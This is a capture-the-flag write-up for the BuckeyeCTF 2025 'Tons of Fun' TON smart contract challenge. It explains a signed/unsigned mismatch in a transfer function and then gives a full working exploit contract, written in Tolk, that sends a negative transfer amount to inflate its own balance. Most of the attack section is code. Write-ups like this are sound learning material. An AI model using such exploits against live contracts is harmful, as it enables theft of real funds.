### Step 1: Smart Contract Analysis

The challenge provides a smart contract on the TON blockchain, written in the Tolk language. The goal is to force the contract to emit a `SuccessLogMessage` to receive the flag.

By reviewing the source code in `tons_of_fun.tolk`, we can see that the `SuccessLogMessage` is only sent when the `CheckBalance` function is called, and only if the caller's (`sender`) balance is greater than or equal to the `BALANCE_FOR_FLAG` constant.

```tolk  
// From tons_of_fun.tolk  
const BALANCE_FOR_FLAG : uint256 = 10000 * CONVERSION_RATE * TON_TO_NANO; // 1,000,000,000,000,000

fun onCheckBalance(in: InMessage) {  
// ...  
val balance = self.balances.get(sender);  
if (balance >= BALANCE_FOR_FLAG) {  
// Sends the success message  
OutMessage.new(/*...*/).send();  
}  
}  
```

The `BALANCE_FOR_FLAG` is an enormous number (effectively 1,000,000 TON), which is impossible to acquire through legitimate deposits. This indicates that a vulnerability must exist to artificially inflate an account's balance.

### Step 2: Vulnerability Discovery (Integer Underflow/Overflow)

The vulnerability is located in the `TransferFunds` function and stems from a critical data type mismatch. While account balances are stored as `uint256` (unsigned integers), the transfer amount in the `TransferFunds` struct is defined as `int256` (signed integer).

```tolk  
// From interface.tolk  
struct (0x20000002) TransferFunds {  
recipient: address  
amount: int256 // <\-- Signed type!  
}  
```

This leads to a flaw in the fund transfer logic:

```tolk  
// From tons_of_fun.tolk  
fun onTransferFunds(in: InMessage, msg: TransferFunds) {  
// ...  
val from_balance = self.balances.get(sender);  
assert (from_balance >= msg.amount); // (1) Flawed check  
// ...  
self.balances.set(sender, from_balance - msg.amount); // (2) Vulnerable arithmetic  
// ...  
}  
```

1\. **Flawed Check:** The comparison between an unsigned integer (`from_balance`) and a signed one (`msg.amount`) is faulty. If we send a large negative number as the `amount`, the condition `from_balance >= msg.amount` will always evaluate to true for any existing account with a positive balance.  
2\. **Vulnerable Arithmetic:** In the line `from_balance - msg.amount`, subtracting a negative number is equivalent to adding a positive one. By sending a "transfer" of `-X`, we can actually **increase** our own balance by `X`.

This is a classic integer overflow vulnerability that allows us to set our balance to any value we want.

### Step 3: Crafting the Exploit

To exploit this, we create a custom smart contract (`exploit.tolk`) that performs three actions in a single transaction sequence:

1\. **Create Account:** Send a `CreateAccount` message to the target contract. This is necessary to register our address in its balance ledger with a small, non-zero balance.  
2\. **Execute Attack:** Send a `TransferFunds` message. For the `amount`, we pass the negative value of `BALANCE_FOR_FLAG`. This abuses the vulnerability to increase our own balance by the exact amount required to get the flag.  
3\. **Claim Flag:** Send a `CheckBalance` message. Since our balance now exceeds the threshold, the target contract emits the `SuccessLogMessage`, and the server rewards us with the flag.

**Final Exploit Code ([contracts/exploit.tolk](<https://github.com/NEMO246/WRITEUP_CTF/blob/main/BuckeyeCTF%202025/misk/Tons%20of%20Fun/exploit.tolk)):**>  
```tolk  
import "interface.tolk";

tolk 1.1

struct (0xDEADBEEF) Run {  
target: address  
admin: address  
}

fun run(target: address, admin: address) {  
// 1. Create the account  
val msg1 = createMessage({  
dest: target,  
value: (TON_TO_NANO / 100) as coins,  
bounce: false,  
body: CreateAccount{}.toCell()  
});  
msg1.send(1);

// 2. Attack using the negative amount  
val msg2 = createMessage({  
dest: target,  
value: (TON_TO_NANO / 100) as coins,  
bounce: false,  
body: TransferFunds{  
recipient: admin,  
amount: -(BALANCE_FOR_FLAG as int256)  
}.toCell()  
});  
msg2.send(1);

// 3. Check balance to receive the flag  
val msg3 = createMessage({  
dest: target,  
value: (TON_TO_NANO / 100) as coins,  
bounce: false,  
body: CheckBalance{}.toCell()  
});  
msg3.send(1);  
}

fun onInternalMessage(in: InMessage) {  
val msg = lazy Run.fromSlice(in.body);  
match (msg) {  
Run => {  
run(msg.target, msg.admin);  
}  
else => {  
assert (in.body.isEmpty()) throw ERROR_CODES.ERROR_WRONG_OPCODE;  
}  
}  
}

fun onBounceMessage(in: InMessageBounced) {}  
```

### Step 4: Execution

With the exploit contract in place, we run the submit script against the remote server to compile and deploy it.

```bash  
npm run submit <https://tons-of-fun.challs.pwnoh.io>  
```
